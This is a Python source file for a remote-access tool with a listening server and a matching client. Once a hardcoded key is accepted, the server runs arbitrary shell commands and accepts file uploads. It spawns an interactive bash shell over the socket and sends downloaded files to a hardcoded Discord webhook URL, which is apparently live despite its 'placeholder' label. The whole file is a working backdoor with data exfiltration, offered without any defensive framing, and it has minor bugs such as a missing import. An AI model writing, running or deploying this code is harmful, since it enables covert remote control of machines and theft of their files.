import os, sys, socket, subprocess, threading, platform, time, logging, json

# Optional: For interactive PTY shell on Unix-like systems
try:
    import pty
    HAS_PTY = True
except ImportError:
    HAS_PTY = False

logging.basicConfig(level=logging.INFO)

DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1343935646695424011/4I-aEwPSLtE7w5idKV0roW1GLeRoluLWzxi_kdoQPkSnuXAvPdTc09UhecKceJfNjrYq")  # Placeholder

class OSDServer:
    def __init__(self, port=872):
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket = None
        self.addr = None

    def start(self):
        self.server_socket.bind(('0.0.0.0', self.port))
        self.server_socket.listen(1)
        logging.info("Listening for incoming connections...")
        self.client_socket, self.addr = self.server_socket.accept()
        logging.info(f"Connection from {self.addr}")
        self.authenticate()
        self.handle_client()

    def authenticate(self):
        shared_key = "secretkey123"
        self.client_socket.send(b"KEY?")
        recv_key = self.client_socket.recv(1024).decode().strip()
        if recv_key != shared_key:
            self.client_socket.send(b"AUTH FAIL")
            self.client_socket.close()
            sys.exit()
        self.client_socket.send(b"AUTH OK")

    def handle_client(self):
        while True:
            try:
                data = self.client_socket.recv(262144)
                if not data:
                    break

                try:
                    command = data.decode().strip()
                except:
                    command = ""

                if command.startswith("sysinfo"):
                    info = platform.platform()
                    self.client_socket.send(info.encode())

                elif command.startswith("upload"):
                    metadata, content = data.split(b";", 1)
                    _, filepath, ftype = metadata.decode().split("@", 2)
                    mode = "w" if ftype == "a" else "wb"
                    with open(filepath, mode) as f:
                        f.write(content if ftype == "b" else content.decode())
                    self.client_socket.send(b"Upload complete.")

                elif command.startswith("download"):
                    _, path, ftype = command.split("@", 2)
                    with open(path, "rb" if ftype == "b" else "r") as f:
                        filedata = f.read()
                        if ftype == "b":
                            filedata = filedata.decode(errors="ignore")
                    chunks = [filedata[i:i+1900] for i in range(0, len(filedata), 1900)]
                    for i, chunk in enumerate(chunks):
                        payload = {
                            "content": f"Part {i+1}/{len(chunks)}:\n```{chunk}```"
                        }
                        requests.post(DISCORD_WEBHOOK, json=payload)
                        time.sleep(1)
                    self.client_socket.send(b"Sent to Discord.")

                elif command.startswith("shell"):
                    if HAS_PTY:
                        os.dup2(self.client_socket.fileno(), 0)
                        os.dup2(self.client_socket.fileno(), 1)
                        os.dup2(self.client_socket.fileno(), 2)
                        pty.spawn("/bin/bash")
                    else:
                        self.client_socket.send(b"PTY shell not supported.")
                        break

                elif command.startswith("nuke"):
                    # Simulated
                    self.client_socket.send(b"Simulating nuke command...")

                else:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    self.client_socket.send(output)

            except Exception as e:
                self.client_socket.send(f"Error: {e}".encode())
                break

        self.client_socket.close()

class OSDClient:
    def __init__(self, target_ip, port=872):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((target_ip, port))

    def authenticate(self):
        key_prompt = self.sock.recv(1024).decode()
        if "KEY?" in key_prompt:
            self.sock.send(b"secretkey123")
            result = self.sock.recv(1024).decode()
            if "AUTH OK" not in result:
                print("Authentication failed.")
                sys.exit()

    def start_shell(self):
        self.authenticate()
        recv_thread = threading.Thread(target=self.receive)
        recv_thread.start()

        while True:
            cmd = input("shell> ")
            if cmd == "exit":
                self.sock.close()
                break
            elif cmd == "upload":
                src = input("Upload from path: ")
                dst = input("Destination path: ")
                ftype = input("File Type [a|b]: ")
                content = open(src, "rb" if ftype == "b" else "r").read()
                if ftype == "b":
                    payload = f"upload@{dst}@{ftype};".encode() + content
                else:
                    payload = f"upload@{dst}@{ftype};{content}".encode()
                self.sock.send(payload)
            elif cmd == "download":
                src = input("Path to download: ")
                ftype = input("File Type [a|b]: ")
                self.sock.send(f"download@{src}@{ftype}".encode())
            elif cmd == "shell":
                self.sock.send(b"shell")
            else:
                self.sock.send(cmd.encode())

    def receive(self):
        while True:
            try:
                data = self.sock.recv(262144)
                if data:
                    print(f"\n{data.decode(errors='ignore')}\nshell> ", end="")
            except:
                break

# Uncomment one of the following depending on role:
# OSDServer().start()
# OSDClient("target_ip_here").start_shell()